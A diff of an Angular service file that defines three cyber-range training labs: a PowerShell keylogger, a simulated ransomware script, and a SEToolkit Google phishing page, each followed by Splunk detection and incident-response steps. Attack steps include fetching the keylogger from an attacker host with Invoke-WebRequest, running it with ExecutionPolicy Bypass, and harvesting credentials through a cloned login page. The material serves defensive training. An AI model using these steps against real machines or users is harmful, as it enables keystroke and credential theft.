@@ -3,48 +3,53 @@ import { Scenario } from './home/home';
 import axios from 'axios';
 
 @Injectable({
-  providedIn: 'root'
+  providedIn: 'root',
 })
 export class ScenarioService {
+  scenarios: (Scenario & {
+    steps: {
+      id: number;
+      title: string;
+      description: string;
+      completed: boolean;
+    }[];
+  })[] = [
+    {
+      id: 'ps-keylogger-splunk',
+      title: 'PowerShell Keylogger: Attack, Detect & Respond',
+      description: `Simulate a PowerShell-based keylogger from Kali to a Windows victim, then detect and alert using Splunk and perform incident response.
+      This scenario demonstrates the full attack chain: initial compromise, payload delivery, execution, detection via SIEM (Splunk), and a guided incident response workflow. You'll learn how attackers use PowerShell for stealthy keylogging, how defenders can spot script block logging events, and how to contain and eradicate the threat. The lab is mapped to MITRE ATT&CK T1056 (Input Capture) and T1086 (PowerShell). Ideal for endpoint security and SIEM analysts.`,
+      time: 45,
+      difficulty: 'Medium',
+      locked: false,
+      category: 'Endpoint + SIEM',
+      stars: 4,
+      completedBy: 0,
+      steps: [
+        {
+          id: 1,
+          title: '🎯 Objective',
+          description: `Simulate a PowerShell-based keylogger attack from Kali (10.0.0.6) to a Windows victim, detect it in Splunk, and walk through containment, eradication, and recovery.`,
+          completed: false,
+        },
 
-  scenarios: (Scenario & { steps: { id: number, title: string, description: string, completed: boolean }[] })[] = [
-  {
-    id: 'ps-keylogger-splunk',
-    title: 'PowerShell Keylogger: Attack, Detect & Respond',
-    description: `Simulate a PowerShell-based keylogger from Kali to a Windows victim, then detect and alert using Splunk and perform incident response.
-    
-This scenario demonstrates the full attack chain: initial compromise, payload delivery, execution, detection via SIEM (Splunk), and a guided incident response workflow. You'll learn how attackers use PowerShell for stealthy keylogging, how defenders can spot script block logging events, and how to contain and eradicate the threat. The lab is mapped to MITRE ATT&CK T1056 (Input Capture) and T1086 (PowerShell). Ideal for endpoint security and SIEM analysts.`,
-    time: 45,
-    difficulty: 'Medium',
-    locked: false,
-    category: 'Endpoint + SIEM',
-    stars: 4,
-    completedBy: 0,
-    steps: [
-      {
-        id: 1,
-        title: '🎯 Objective',
-        description: `Simulate a PowerShell-based keylogger attack from Kali (10.0.0.6) to a Windows victim, detect it in Splunk, and walk through containment, eradication, and recovery.`,
-        completed: false
-      },
-
-      // ========== 1️⃣ Attacker (Kali: 10.0.0.6) ==========
-      {
-        id: 2,
-        title: 'Kali: Start HTTP server',
-        description: `On Kali, host a simple web server to serve the payload:\n\ncd /var/www/html\npython3 -m http.server 1234`,
-        completed: false
-      },
-      {
-        id: 3,
-        title: 'Kali: Place keylogger.ps1',
-        description: `Copy keylogger.ps1 into /var/www/html so it’s reachable at http://10.0.0.6:1234/keylogger.ps1`,
-        completed: false
-      },
-      {
-        id: 4,
-        title: 'keylogger.ps1 (full content)',
-        description: `PowerShell script used for simulation (educational use only):
+        // ========== 1️⃣ Attacker (Kali: 10.0.0.6) ==========
+        {
+          id: 2,
+          title: 'Kali: Start HTTP server',
+          description: `On Kali, host a simple web server to serve the payload:\n\ncd /var/www/html\npython3 -m http.server 1234`,
+          completed: false,
+        },
+        {
+          id: 3,
+          title: 'Kali: Place keylogger.ps1',
+          description: `Copy keylogger.ps1 into /var/www/html so it’s reachable at http://10.0.0.6:1234/keylogger.ps1`,
+          completed: false,
+        },
+        {
+          id: 4,
+          title: 'keylogger.ps1 (full content)',
+          description: `PowerShell script used for simulation (educational use only):
 
 \`\`\`powershell
 # PowerShell Keylogger for Simulated Test Environments
@@ -145,7 +150,7 @@ while ($true) {
     }
 }
           \`\`\``,
-          completed: false
+          completed: false,
         },
 
         // ========== 2️⃣ Victim (Windows) ==========
@@ -153,19 +158,19 @@ while ($true) {
           id: 5,
           title: 'Windows: Download payload',
           description: `Run in PowerShell as victim user:\n\nInvoke-WebRequest -Uri "http://10.0.0.6:1234/keylogger.ps1" -OutFile "C:\\Users\\victim\\Desktop\\keylogger.ps1"`,
-          completed: false
+          completed: false,
         },
         {
           id: 6,
           title: 'Windows: Execute payload',
           description: `Start the keylogger bypassing policy:\n\npowershell.exe -ExecutionPolicy Bypass -File C:\\Users\\victim\\Desktop\\keylogger.ps1`,
-          completed: false
+          completed: false,
         },
         {
           id: 7,
           title: 'Windows: Verify keylog output',
-          description: `Confirm output is written to:\n\nC:\\Users\\victim\\AppData\\Local\\Temp\\keylog.txt`,
-          completed: false
+          description: `Confirm output is written to:\n\nGet-Content "$env:TEMP\\keylog.txt"`,
+          completed: false,
         },
 
         // ========== 3️⃣ Detection in Splunk ==========
@@ -173,19 +178,19 @@ while ($true) {
           id: 8,
           title: 'Splunk: Start service',
           description: `If stopped, start Splunk on Windows:\n\n"& \\"C:\\\\Program Files\\\\Splunk\\\\bin\\\\splunk.exe\\" start"\n\nLogin → user: admin / pass: admin`,
-          completed: false
+          completed: false,
         },
         {
           id: 9,
           title: 'Splunk: Search for PS script blocks',
           description: `Run this search to find suspicious use:\n\nsource="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 ("keylogger.ps1" OR "keylog.txt" OR "Out-File" OR "Start-Sleep")\n\nYou should see events referencing the keylogger.`,
-          completed: false
+          completed: false,
         },
         {
           id: 10,
           title: 'Splunk: Create alert',
           description: `Save the search as:\n\nName: PowerShell Keylogger Detection\nType: Alert → Trigger: Per-Result\nAction: Send Email (configure SMTP) or Add to Triggered Alerts`,
-          completed: false
+          completed: false,
         },
 
         // ========== 4️⃣ Incident Response ==========
@@ -193,29 +198,27 @@ while ($true) {
           id: 11,
           title: 'IR: Containment',
           description: `Terminate malicious PowerShell and isolate if needed:\n\nStop-Process -Name powershell -Force\n(Optionally disconnect the host from the network)`,
-          completed: false
+          completed: false,
         },
         {
           id: 12,
           title: 'IR: Eradication',
           description: `Remove artifacts and check persistence:\n\nRemove-Item "C:\\\\Users\\\\victim\\\\Desktop\\\\keylogger.ps1" -Force\nRemove-Item "C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\keylog.txt" -Force\nInspect Scheduled Tasks and Run keys for persistence`,
-          completed: false
+          completed: false,
         },
         {
           id: 13,
           title: 'IR: Recovery',
           description: `Reboot the system and re-enable security controls (ExecutionPolicy, Defender, etc.).`,
-          completed: false
+          completed: false,
         },
         {
           id: 14,
           title: 'IR: Lessons Learned',
           description: `Educate users about risky scripts. Continue to monitor PowerShell Event ID 4104 (script block logging) and Sysmon Event ID 1 (process creation).`,
-          completed: false
-        }
+          completed: false,
+        },
       ],
-
-
     },
     // 🆕 2nd Scenario: Ransomware Simulation (PowerShell)
     {
@@ -235,13 +238,13 @@ This hands-on scenario lets you experience a ransomware attack without real risk
           id: 1,
           title: '🎯 Objective',
           description: `Simulate a ransomware attack in a safe environment using a custom PowerShell script, then perform incident response by investigating, locating the encryption key, and recovering the files.\n\nMITRE ATT&CK: T1486 – Data Encrypted for Impact`,
-          completed: false
+          completed: false,
         },
         {
           id: 2,
           title: '🛠 Preconfigured Lab Setup',
           description: `On the Victim VM (Windows) Desktop, you already have:\n\n\`\`\`\nC:\\Users\\victim\\Desktop\\Ransomware_Scenario\n│   Safe_Ransom.ps1          ← PowerShell script (attack & recovery)\n│\n└───Test_Files\n       doc1.txt               ← sample plaintext file\n       doc2.txt               ← sample plaintext file\n\`\`\`\n• Safe_Ransom.ps1 = simulator script\n• Test_Files = preloaded victim files`,
-          completed: false
+          completed: false,
         },
         {
           id: 3,
@@ -356,66 +359,75 @@ else {
     Write-Host "Usage: powershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Encrypt|Decrypt"
 }
 \`\`\``,
-          completed: false
+          completed: false,
         },
         // ---- Attack Phase (Encryption) ----
         {
           id: 4,
           title: '🚀 Attack: Navigate to folder',
-          description: 'Open PowerShell and run:\n\ncd C:\\Users\\victim\\Desktop\\Ransomware_Scenario',
-          completed: false
+          description:
+            'Open PowerShell and run:\n\ncd C:\\Users\\victim\\Desktop\\Ransomware_Scenario',
+          completed: false,
         },
         {
           id: 5,
           title: 'Run Encrypt mode',
-          description: 'Execute:\n\npowershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Encrypt',
-          completed: false
+          description:
+            'Execute:\n\npowershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Encrypt',
+          completed: false,
         },
         {
           id: 6,
           title: 'Verify encrypted outputs',
-          description: 'Check Test_Files contents:\n\n```\nTest_Files\n  doc1.txt.enc\n  doc2.txt.enc\n  README_RECOVER.txt   ← ransom note\n  _SimLog.txt          ← simulation log\n```\n\nKey + IV stored at: C:\\Temp\\SafeRansom_Key.json',
-          completed: false
+          description:
+            'Check Test_Files contents:\n\n```\nTest_Files\n  doc1.txt.enc\n  doc2.txt.enc\n  README_RECOVER.txt   ← ransom note\n  _SimLog.txt          ← simulation log\n```\n\nKey + IV stored at: C:\\Temp\\SafeRansom_Key.json',
+          completed: false,
         },
 
         // ---- IR Phase ----
         {
           id: 7,
           title: '🕵 Detection',
-          description: 'Open README_RECOVER.txt in Test_Files and confirm original files now have .enc extension.',
-          completed: false
+          description:
+            'Open README_RECOVER.txt in Test_Files and confirm original files now have .enc extension.',
+          completed: false,
         },
         {
           id: 8,
           title: '🔎 Investigation: Locate key',
-          description: 'View the key file and parse JSON:\n\nGet-Content C:\\Temp\\SafeRansom_Key.json\n\n$keyData = Get-Content C:\\Temp\\SafeRansom_Key.json -Raw | ConvertFrom-Json\n$keyData',
-          completed: false
+          description:
+            'View the key file and parse JSON:\n\nGet-Content C:\\Temp\\SafeRansom_Key.json\n\n$keyData = Get-Content C:\\Temp\\SafeRansom_Key.json -Raw | ConvertFrom-Json\n$keyData',
+          completed: false,
         },
         {
           id: 9,
           title: '🛡 Containment',
-          description: 'Preserve artifacts (ransom note + key JSON). Optionally restrict script execution to prevent further impact (e.g., tighten policy/AppLocker) while keeping the lab intact.',
-          completed: false
+          description:
+            'Preserve artifacts (ransom note + key JSON). Optionally restrict script execution to prevent further impact (e.g., tighten policy/AppLocker) while keeping the lab intact.',
+          completed: false,
         },
         {
           id: 10,
           title: '🔧 Recovery: Decrypt files',
-          description: 'Run the script to restore data:\n\npowershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Decrypt',
-          completed: false
+          description:
+            'Run the script to restore data:\n\npowershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Decrypt',
+          completed: false,
         },
         {
           id: 11,
           title: '✅ Verify restoration',
-          description: 'Test_Files should be back to:\n\n```\nTest_Files\n  doc1.txt\n  doc2.txt\n```\nRansom note and log are removed.',
-          completed: false
+          description:
+            'Test_Files should be back to:\n\n```\nTest_Files\n  doc1.txt\n  doc2.txt\n```\nRansom note and log are removed.',
+          completed: false,
         },
         {
           id: 12,
           title: '📘 Lessons Learned',
-          description: '• Ransomware encrypts files and leaves a note\n• IR analysts hunt for keys to restore data\n• In this lab, key is at C:\\Temp\\SafeRansom_Key.json\n• Demonstrates end‑to‑end IR safely',
-          completed: false
-        }
-      ]
+          description:
+            '• Ransomware encrypts files and leaves a note\n• IR analysts hunt for keys to restore data\n• In this lab, key is at C:\\Temp\\SafeRansom_Key.json\n• Demonstrates end‑to‑end IR safely',
+          completed: false,
+        },
+      ],
     },
 
     //scenario 3
@@ -436,13 +448,13 @@ This scenario simulates a real-world phishing attack using SEToolkit on Kali Lin
           id: 1,
           title: '🎯 Objective',
           description: `Simulate a Google credential-harvesting phishing attack with SEToolkit and practice the full IR workflow (detection, containment, eradication, recovery, documentation).`,
-          completed: false
+          completed: false,
         },
         {
           id: 2,
           title: 'Lab Setup',
           description: `Attacker: Kali with SEToolkit. Victim: Windows 10/11. Same private network.\nExample IPs → Attacker: 10.0.0.6, Victim: 192.168.100.3`,
-          completed: false
+          completed: false,
         },
 
         // --- Attack Execution (Kali) ---
@@ -450,45 +462,50 @@ This scenario simulates a real-world phishing attack using SEToolkit on Kali Lin
           id: 3,
           title: 'Kali: Launch SEToolkit',
           description: 'Run:\n\nsudo setoolkit',
-          completed: false
+          completed: false,
         },
         {
           id: 4,
           title: 'Kali: Menu Path',
-          description: 'Choose:\n1) Social-Engineering Attacks →\n2) Website Attack Vectors →\n3) Credential Harvester Attack Method →\n1) Web Templates',
-          completed: false
+          description:
+            'Choose:\n1) Social-Engineering Attacks →\n2) Website Attack Vectors →\n3) Credential Harvester Attack Method →\n1) Web Templates',
+          completed: false,
         },
         {
           id: 5,
           title: 'Kali: Select Google template',
           description: 'When prompted, select the Google template.',
-          completed: false
+          completed: false,
         },
         {
           id: 6,
           title: 'Kali: Enter Host IP',
-          description: 'Enter attacker IP (e.g., 10.0.0.6). The fake page will be served at http://10.0.0.6',
-          completed: false
+          description:
+            'Enter attacker IP (e.g., 10.0.0.6). The fake page will be served at http://10.0.0.6',
+          completed: false,
         },
         {
           id: 7,
           title: 'Kali: Credential Storage',
-          description: 'Captured credentials are saved under: /root/.set/reports/',
-          completed: false
+          description:
+            'Captured credentials are saved under: /root/.set/reports/',
+          completed: false,
         },
 
         // --- Victim Activity (Windows) ---
         {
           id: 8,
           title: 'Victim: Browse to Phish',
-          description: 'Open a browser and visit: http://10.0.0.6\nA fake Google login page should load.',
-          completed: false
+          description:
+            'Open a browser and visit: http://10.0.0.6\nA fake Google login page should load.',
+          completed: false,
         },
         {
           id: 9,
           title: 'Victim: Credential Entry',
-          description: 'Enter test creds to simulate compromise. Observe attacker console reporting credentials in real time.',
-          completed: false
+          description:
+            'Enter test creds to simulate compromise. Observe attacker console reporting credentials in real time.',
+          completed: false,
         },
 
         // --- Incident Response Workflow ---
@@ -496,31 +513,31 @@ This scenario simulates a real-world phishing attack using SEToolkit on Kali Lin
           id: 10,
           title: 'IR: 🔎 Detection',
           description: `User report + analyst checks:\n• Browser history (Ctrl+H) → look for http://10.0.0.6\n• Hosts file: C:\\Windows\\System32\\drivers\\etc\\hosts (ensure no fake google.com)\n• DNS cache: ipconfig /displaydns (check suspicious resolutions)`,
-          completed: false
+          completed: false,
         },
         {
           id: 11,
           title: 'IR: 🛡 Containment',
           description: `Block attacker IP on Windows:\n\nNew-NetFirewallRule -DisplayName "Block Phishing IP" -Direction Outbound -RemoteAddress 10.0.0.6 -Action Block\n\nVerify the site is no longer reachable.`,
-          completed: false
+          completed: false,
         },
         {
           id: 12,
           title: 'IR: 🧹 Eradication',
           description: `• ipconfig /flushdns\n• Clear browser cache/history\n• Delete phishing email (if used)\n• AV scan to confirm no malware was downloaded`,
-          completed: false
+          completed: false,
         },
         {
           id: 13,
           title: 'IR: 🔧 Recovery',
           description: `• Reset Google account password\n• Enable MFA\n• Verify access via https://accounts.google.com`,
-          completed: false
+          completed: false,
         },
         {
           id: 14,
           title: 'IR: 📘 Lessons Learned',
           description: `• Check URLs before entering creds\n• Enforce MFA\n• Add URL/email filtering\n• Improve user awareness training`,
-          completed: false
+          completed: false,
         },
 
         // --- Documentation ---
@@ -528,25 +545,20 @@ This scenario simulates a real-world phishing attack using SEToolkit on Kali Lin
           id: 15,
           title: '📝 Documentation: Incident Report',
           description: `Template fields:\n• Date/Time: 2025-08-18\n• Type: Phishing – Credential Harvester (Google)\n• Attacker IP: 10.0.0.6 | Victim IP: 192.168.100.3\n• IOCs: Browser history http://10.0.0.6, DNS google.com→10.0.0.6\n• Detection: User report + analyst confirmation\n• Containment: Firewall block\n• Eradication: Flush DNS, clear history, remove phish\n• Recovery: Reset password, enable MFA\n• Lessons: Training, MFA, URL filtering`,
-          completed: false
-        }
-      ]
-    }
-
-
-
-
-
+          completed: false,
+        },
+      ],
+    },
   ];
 
-  constructor() { }
+  constructor() {}
   private baseUrl = 'http://localhost:5000/api'; // Flask backend URL
 
   getScenario(id: string | null) {
     if (!id) {
       return undefined;
     }
-    return this.scenarios.find(s => s.id === id);
+    return this.scenarios.find((s) => s.id === id);
   }
 
   async getStatus() {
@@ -554,7 +566,6 @@ This scenario simulates a real-world phishing attack using SEToolkit on Kali Lin
     //console.log('🔄 Status response:', response.data);
     return response.data;
   }
-
 
   getAllScenarios() {
     return this.scenarios;
